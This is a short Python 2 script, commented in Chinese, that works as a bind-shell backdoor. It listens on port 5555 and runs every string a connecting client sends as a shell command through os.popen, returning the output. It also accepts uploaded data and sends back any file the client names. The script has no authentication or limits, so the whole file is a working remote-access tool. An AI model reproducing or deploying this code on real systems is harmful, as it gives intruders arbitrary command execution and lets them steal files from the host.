#!/usr/bin/env python
#-*- utf8 -*-  
import socket           # 调用socket库
import os               # 调用os库

HOST = "192.168.43.198"          # 定义服务器ip
PORT = 5555                      # 定义端口号
addr = (HOST,PORT)               # 由于使用socket进行连接，需要把ip和端口先转换为元组
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)      # 设定了网络连接方式，以及传输使用的协议
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(addr)                                              
s.listen(1)
conn,addr = s.accept()

def get_file():
    conn.send("please sendfile:")         # 向客户端发送提示信息
    while True:
        data = conn.recv(1024)            # 设置接受数据大小
        with open("/root/Desktop/up_load/data.txt","ab") as f:    # 向指定的目录写入客户端发送过来的信息
            f.write(data)
        if not data:
            break
    conn.close()                             # 关闭连接

def send_file():
    filepath = conn.recv(1024)                 # 设置接受数据大小，接受客户端发送来的文件路径
    with open(filepath,'rb') as f:             # 读取客户端指定的文件
        data = f.read()                        
    conn.sendall(data)                        # 向客户端发送客户端指定的文件内容
    conn.close()                              # 关闭连接

def main():
    while True:
        cmd = conn.recv(1024)             # 接收客户端发送来的数据
        if cmd == "bye":                  # 如果客户端发送过来的是bye,结束程序
            break
        if cmd == "upload":               # 如果客户端发送过来的是upload,调用函数get_file(),结束程序
            get_file()
            break
        if cmd == "down":                 # 如果客户端发送过来的是down,调用函数send_file(),结束程序
            send_file()
            break
        data = os.popen(cmd)              # popen()可以执行shell命令，并读取此命令返回值
        sdata = data.read()               # 将得到的内容通过read()转换后给了sdata
        if sdata:
            conn.sendall(sdata)           # 将得到的内容全部发送给客户端
        else:
            conn.send("finish")           # 如果客户端发送过来的是其他没有的指令，向客户端返回finish,防止程序假死
    conn.close()                          # 关闭连接
    s.close()

if __name__ == "__main__":
    main()